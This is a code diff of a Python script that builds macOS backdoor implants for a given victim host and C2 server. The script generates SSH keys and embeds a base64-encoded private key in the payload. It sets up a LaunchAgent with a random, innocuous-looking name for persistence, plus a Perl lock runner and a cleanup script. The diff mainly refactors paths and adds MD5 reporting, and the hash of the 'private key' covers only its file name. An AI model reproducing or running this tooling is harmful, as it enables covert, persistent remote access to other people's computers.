@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 
+from genericpath import exists
+from opcode import haslocal
 import os
 import subprocess
 import random
@@ -8,12 +10,15 @@ import base64
 from io import StringIO
 import re
 import uuid
+import datetime
+import hashlib
+from pathlib import Path
 
 logging = True
-backflipsBaseDir = "/opt/backflips"
-keysDir = f"{backflipsBaseDir}/keys"
-payloadsDir = f"{backflipsBaseDir}/payloads"
-cleanupScriptsDir = f"{backflipsBaseDir}/cleanup"
+backflipsBaseDir = Path("/opt/backflips/")
+keysDir = Path(f"{backflipsBaseDir}/keys/")
+payloadsDir = Path(f"{backflipsBaseDir}/payloads/")
+cleanupScriptsDir = Path(f"{backflipsBaseDir}/cleanup/")
 
 def usage():
     print ("usage: %s <username> <victim_host> <c2_fqdn/ip> <port> <remoteport>" % sys.argv[0])
@@ -61,11 +66,13 @@ def main():
         sys.stderr.write("'/usr/share/dict/words' not found. You need to install a dictionary with 'apt install wamerican'\n")
         sys.exit(1)
 
-    if not os.path.exists(payloadsDir):
-        print(f"[*] backflips directory '{backflipsBaseDir}'not found, creating it now...")
-        os.makedirs(f"{keysDir}")
-        os.makedirs(f"{payloadsDir}")
-        os.makedirs(f"{cleanupScriptsDir}")
+    # Check that the backflips directories are setup with rational structure
+    if not(keysDir.exists() and payloadsDir.exists() and cleanupScriptsDir.exists()):
+        print(f"[*] Backflips output directories are not setup, creating it now under '{backflipsBaseDir}/'...")
+        payloadsDir.mkdir(parents=True, exist_ok=True)
+        keysDir.mkdir(parents=True, exist_ok=True)
+        cleanupScriptsDir.mkdir(parents=True, exist_ok=True)
+    
 
     username = sys.argv[1]
     victim_hostname = sys.argv[2]
@@ -76,25 +83,26 @@ def main():
     flockfilename = "".join(getrandomwords(1))
     lagentname = f"com.{'.'.join(getrandomwords(2))}.worker"
     imaginarypayloadname = "".join(getrandomwords(1))
-    
+
+    print(f"[*] Date of backflipdeploy invocation: {str(datetime.datetime.utcnow())} UTC")   
     print ("[*] victim host: %s" % victim_hostname)
     print ("[*] fqdn: %s" % fqdn)
     print ("[*] port: %s" % port)
 
-    KEYPATH = f"{keysDir}/{username}-{victim_hostname}-{fqdn}"
+    keyPath = f"{keysDir}/{username}-{victim_hostname}-{fqdn}"
     print ("[*] generating keypair")
-    os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{KEYPATH}' -N ''")
+    os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keyPath}' -N ''")
     print ("[*] adding to flip's authorized keys")
     os.system(f"echo '' >> {backflipsBaseDir}/authorized_keys")
-    os.system(f"cat '{KEYPATH}.pub' >> {backflipsBaseDir}/authorized_keys")
+    os.system(f"cat '{keyPath}.pub' >> {backflipsBaseDir}/authorized_keys")
     os.system(f"echo \"{fqdn} $(ssh-keyscan -p {remoteport} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">{keysDir}/serverpub.pub")
     backstring= getfile(f"{keysDir}/serverpub.pub")
     backencode = backstring.encode("utf-8")
     backkey = base64.b64encode(backencode)
-    pubstring = getfile(KEYPATH+ ".pub")
+    pubstring = getfile(f"{keyPath}.pub")
     pubencoded = pubstring.encode("utf-8")
     pubkey = base64.b64encode(pubencoded)
-    privstring = getfile(KEYPATH)
+    privstring = getfile(keyPath)
     privencoded = privstring.encode("utf-8")
     privkey = base64.b64encode(privencoded)
 
@@ -113,7 +121,7 @@ def main():
 </dict>
 </plist>'''.encode('utf-8')).decode('utf-8')
 
-    mother_flock = base64.b64encode(f"""#!/usr/bin/env perl
+    motherflock = base64.b64encode(f"""#!/usr/bin/env perl
 # {" ".join(getrandomwords(3))}
 use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB or die;system(@ARGV);
 # {" ".join(getrandomwords(2))}""".encode('utf-8')).decode('utf-8')
@@ -129,7 +137,7 @@ use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB 
         "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
         "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
         "FLOCK_NAME_PLACEHOLDER" : flockfilename,
-        "FLOCK_CODE_PLACEHOLDER" : mother_flock,
+        "FLOCK_CODE_PLACEHOLDER" : motherflock,
         "LAGENT_XML_PLACEHOLDER" : lagentPlistXML,
         "LAGENT_NAME_PLACEHOLDER" : lagentname,
         "IMAGINARY_PAYLOAD_NAME" : imaginarypayloadname,
@@ -148,12 +156,22 @@ use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB 
     with open(f"{payloadsDir}/{implantName}", 'w') as file:
         file.write(implant)
 
-    print(f"[+] Backflip keypath: {KEYPATH}")
-    print(f"[+] The mac backflip payload is located @ {payloadsDir}/{implantName}")
-    print(f"[+] The mac backflip cleanup script is located @ {cleanupScriptsDir}/{implantName}_cleanup.py")
-    print(f"[I] The implant private key will be named '{payloadkeyname}' instead of badger")
-    print(f"[I] The FLock will be named '{flockfilename}.pl'")
-    print(f"[I] The LaunchAgent will be named '{lagentname}'")
+    implantHash = hashlib.md5(implant.encode('utf-8')).hexdigest()
+    flockHash = hashlib.md5(motherflock.encode('utf-8')).hexdigest()
+    implantPrivKeyHash = hashlib.md5(payloadkeyname.encode('utf-8')).hexdigest()
+
+    print(f"\n[+] Path of backflip public key on infra: {keyPath}")
+    print(f"[I] Name of backflip private key file is '{payloadkeyname}' instead of badger")
+    print(f"[I] MD5 hash for backflip private key is '{payloadkeyname}' is '{implantPrivKeyHash}'")
+    print(f"\n[+] Path of backflip payload on infra: {payloadsDir}/{implantName}")
+    print(f"[I] MD5 hash for backflip payload is '{implantHash}'")
+    print(f"[I] Name of FLock file is '{flockfilename}.pl'")
+    print(f"[I] MD5 hash for FLock is '{flockHash}'")
+    print(f"[I] Name of LaunchAgent is '{lagentname}'")
+    print(f"[I] MD5 hash for LaunchAgent must be calculated on the victim host.")
+    print(f"\n[+] Path of cleanup script on infra: {cleanupScriptsDir}/{implantName}_cleanup.py")
+    print(f"\n[+] Have a nice day!")
+
 
 if __name__ == "__main__":
     main()
